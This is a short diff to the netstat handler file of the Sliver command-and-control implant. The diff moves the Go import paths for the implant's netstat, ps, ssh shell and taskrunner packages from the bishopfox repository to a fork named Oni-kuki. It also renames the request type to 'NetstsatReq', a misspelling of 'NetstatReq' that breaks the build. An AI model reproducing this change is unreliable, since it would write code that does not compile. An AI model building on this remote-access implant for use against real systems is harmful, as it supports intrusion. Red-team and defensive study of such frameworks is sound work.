@@ -27,12 +27,12 @@ import (
 	"log"
 	// {{end}}
 
-	"github.com/bishopfox/sliver/implant/sliver/netstat"
-	"github.com/bishopfox/sliver/implant/sliver/ps"
-	"github.com/bishopfox/sliver/implant/sliver/shell/ssh"
-	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
-	"github.com/bishopfox/sliver/protobuf/commonpb"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/Oni-kuki/sliver/implant/sliver/netstat"
+	"github.com/Oni-kuki/sliver/implant/sliver/ps"
+	"github.com/Oni-kuki/sliver/implant/sliver/shell/ssh"
+	"github.com/Oni-kuki/sliver/implant/sliver/taskrunner"
+	"github.com/Oni-kuki/sliver/protobuf/commonpb"
+	"github.com/Oni-kuki/sliver/protobuf/sliverpb"
 
 	"google.golang.org/protobuf/proto"
 )
@@ -132,7 +132,7 @@ func ifconfig() *sliverpb.Ifconfig {
 }
 
 func netstatHandler(data []byte, resp RPCResponse) {
-	netstatReq := &sliverpb.NetstatReq{}
+	netstatReq := &sliverpb.NetstsatReq{}
 	err := proto.Unmarshal(data, netstatReq)
 	if err != nil {
 		//{{if .Config.Debug}}
